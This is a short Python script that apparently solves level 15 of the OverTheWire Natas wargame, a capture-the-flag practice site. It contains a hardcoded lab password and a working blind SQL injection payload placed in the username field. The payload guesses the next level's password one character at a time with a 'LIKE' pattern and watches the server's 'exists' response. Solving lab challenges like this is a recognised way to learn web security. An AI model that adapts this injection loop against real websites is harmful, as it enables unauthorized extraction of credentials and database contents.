import requests
from string import *

c = ascii_lowercase + ascii_uppercase + digits
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = f"http://{username}.natas.labs.overthewire.org/"
pw = ""

session = requests.Session()
response = session.get(url, auth=(username, password))
print(response.text)
print("Status code:", response.status_code)

def get_password(seen_pw):
    u = "natas16"
    for i in c:
        response = session.post(url, auth=(username, password), data={"username": f'{u}" and BINARY password like "{seen_pw}{i}%" #'})
        if "exists" in response.text:
            print("Found character:", i)
            seen_pw = seen_pw + i
            
        else:
            print("Not found:", i)
    return seen_pw

seen_pw = ""
for _ in range(64):
    seen_pw = get_password(seen_pw)
    
print("Password:", seen_pw)